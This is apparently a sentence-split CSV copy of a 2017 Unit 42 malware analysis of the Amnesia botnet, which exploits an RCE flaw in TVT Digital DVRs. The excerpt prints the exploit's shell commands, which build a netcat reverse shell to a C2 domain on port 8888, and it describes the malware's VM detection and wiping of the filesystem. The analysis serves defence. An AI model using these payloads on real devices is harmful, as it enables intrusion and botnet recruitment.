Number,Content
"""Sentence 1","new iot/linux malware targets dvrs, forms botnet
60,454
people reacted
5
7 min."
"""Sentence 2","read
share 
by claud xiao and cong zheng

april 6, 2017 at 1:00 pm

category: malware, unit 42

tags: amnesia, botnet, dvr, iot, linux, tsunami

this post is also available in: 日本語 (japanese)

unit 42 researchers have identified a new variant of the iot/linux botnet “tsunami”, which we are calling “amnesia”."
"""Sentence 3",the amnesia botnet targets an unpatched remote code execution vulnerability that was publicly disclosed over a year ago in march 2016 in dvr (digital video recorder) devices made by tvt digital and branded by over 70 vendors worldwide (a listing of which can be found on the original vulnerability report we've linked to).
"""Sentence 4","based on our scan data shown below in figure 1, this vulnerability affects approximately 227,000 devices around the world with taiwan, the united states, israel, turkey, and india being the most exposed."
"""Sentence 5","amnesia_1

figure 1  distribution of vulnerable tvt digital's dvr devices


in addition, we believe the amnesia malware is the first linux malware to adopt virtual machine evasion techniques to defeat malware analysis sandboxes."
"""Sentence 6",virtual machine evasion techniques are more commonly associated with microsoft windows and google android malware.
"""Sentence 7","similar to those, amnesia tries to detect whether it’s running in a virtualbox, vmware or qemu based virtual machine, and if it detects those environments it will wipe the virtualized linux system by deleting all the files in file system."
"""Sentence 8",this affects not only linux malware analysis sandboxes but also some qemu based linux servers on vps or on public cloud.
"""Sentence 9","amnesia exploits this remote code execution vulnerability by scanning for, locating, and attacking vulnerable systems."
"""Sentence 10",a successful attack results in amnesia gaining full control of the device.
"""Sentence 11","attackers could potentially harness the amnesia botnet to launch broad ddos attacks similar to the mirai botnet attacks we saw in fall 2016.

even though this vulnerability was disclosed over a year ago, despite our best efforts, we have been unable to find updates that fix this vulnerability."
"""Sentence 12","while the amnesia botnet hasn’t yet been used to mount large scale attacks, the mirai botnet attacks show the potential harm large-scale iot-based botnets can cause."
"""Sentence 13",palo alto networks recommends all customers ensure they have our latest protections in place.
"""Sentence 14","additionally, everyone should block traffic to amnesia’s command and control servers (c2s) listed in indicators of compromise (ioc) section of this blog should do so."
"""Sentence 15","technical details
vulnerability details

on march 22, 2016, security researcher rotem kerner disclosed the vulnerability to the public."
"""Sentence 16","according to his blog, over 70 dvr vendors around the world were affected by the vulnerability."
"""Sentence 17","however, all the dvr devices were manufactured by the same company, “tvt digital”."
"""Sentence 18","to date, we have been unable to find any patch released by the vendors or the manufacturer to address the vulnerability."
"""Sentence 19","additionally, by using the fingerprint of “cross web server”, we discovered over 227,000 devices exposed on internet that are likely produced by tvt digital."
"""Sentence 20",we also searched the keyword on shodan.io and on censys.io.
"""Sentence 21","they reported about 50,000 and about 705,000 ip addresses respectively."
"""Sentence 22","table 1 shows the top 20 countries for potentially vulnerable tvt digital dvr devices:

1.	taiwan	47170
2.	united states	44179
3.	israel	23355
4.	turkey	11780
5.	india	9796
6.	malaysia	9178
7.	mexico	7868
8.	italy	7439
9.	vietnam	6736
10.	united kingdom	4402
11.	russia	3571
12.	hungary	3529
13.	france	3165
14.	bulgaria	3040
15.	romania	2783
16.	colombia	2616
17.	egypt	2541
18.	canada	2491
19.	iran	1965
20.	argentina	1748
table 1 top 20 countries for potentially vulnerable tvt dvr digital devices

propagation and vulnerability exploitation

amnesia communicates with its c2 server using the irc protocol."
"""Sentence 23","figure 2 shows some commands it was designed to receive, including to launch ddos attacks by different types of http flooding and udp flooding."
"""Sentence 24","amnesia_2

figure 2  c2 commands of amnesia

in addition to these commands, two more commands were implemented: cctvscanner and cctvprocs."
"""Sentence 25",these commands are used for scanning and exploiting the rce vulnerability in tvt digital dvrs.
"""Sentence 26","after receiving the commands, amnesia will firstly make a simple http request to the ip address included with the command, checking whether the target is a vulnerable dvr device."
"""Sentence 27",this is done by searching for a special string “cross web server” in the http response content as shown in figure 3 since the tvt digital’s dvrs used this string as server name in http header.
"""Sentence 28","amnesia_3

figure 3  check whether the target is a vulnerable dvr

if a vulnerable dvr is found, amnesia will send four more http requests which contains exploit payloads of four different shell commands."
"""Sentence 29","the commands are:

echo nc > f
echo {one_of_c2_domains} >> f
echo 8888 –e $shell >> f
$(cat f) & > r
these commands create a shell script file and execute it."
"""Sentence 30",the script content connects with one of amnesia c2 servers and to expose system default shell.
"""Sentence 31","therefore, the infected devices will be compromised and will listen further shell commands sent from c2 servers as shown in figure 4

amnesia_4

figure 4  exploit the rce vulnerability

anti-forensics

when an amnesia sample executes, it will immediately check whether it’s running in a virtual machine by reading files /sys/class/dmi/id/product_name and /sys/class/dmi/id/sys_vendor and comparing the file contents with keywords “virtualbox”, “vmware” and “qemu” as shown in figure 5. these two files are used by linux dmi (desktop management interface) to store hardware’s product and manufacturer information."
"""Sentence 32","these strings being included in the dmi files implies that the linux system is running in a virtual machine based on virtualbox, vmware or qemu, respectively."
"""Sentence 33","amnesia_5

figure 5  inspects dmi files to detect vm

if a virtual machine was detected, amnesia will delete itself, and then try to delete all of the following directories:

the linux root directory “/”,
the current user’s home directory “~/”, and
the current working directory “./”
these delete operations are basically equivalent to wiping the whole linux system."
